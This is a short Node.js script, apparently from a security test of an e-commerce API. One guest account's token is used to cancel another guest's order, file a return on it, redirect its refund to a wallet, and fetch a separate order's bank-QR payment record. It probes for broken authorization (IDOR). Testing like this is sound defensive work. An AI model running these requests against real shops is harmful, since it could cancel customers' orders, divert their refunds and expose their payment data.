import { req, guest, short } from './lib.mjs';
import fs from 'node:fs';
const c = JSON.parse(fs.readFileSync('idor-ctx.json','utf8'));
const X = await guest('d_baomat_attack_00000001');
const V = await guest('d_baomat_victim_00000001');
const ord = (await req('GET','/orders/'+c.code,{tok:V.tok})).body;
const oi = ord.items[0].id;
const t = X.tok;
for (const [m,p,b] of [
 ['POST','/orders/'+c.code+'/cancel',{cancelReasonCode:'CHANGED_MIND'}],
 ['POST','/orders/'+c.code+'/return-request',{items:[{orderItemId:oi,quantity:1}],reason:'x'}],
 ['POST','/orders/'+c.code+'/return-estimate',{items:[{orderItemId:oi,quantity:1}]}],
 ['POST','/orders/me/refunds/'+oi+'/destination',{refundMethod:'WALLET'}],
]) { const r = await req(m,p,{tok:t,body:b}); console.log('X→',m,p.slice(0,55).padEnd(55),r.status,short(r.body,140)); }
// Cancel by victim to see cancel path works for owner (not run)  -- skip
console.log('V order status still', (await req('GET','/orders/'+c.code,{tok:V.tok})).body.status);
// notifications list of X doesn't contain V
console.log('X notifications', short((await req('GET','/me/notifications',{tok:t})).body,100));
// returning's order via X: using known code
console.log('X→ returning bank order', (await req('GET','/orders/TUBU2026110364874',{tok:t})).status, (await req('GET','/payments/bank-qr/TUBU2026110364874',{tok:t})).status);
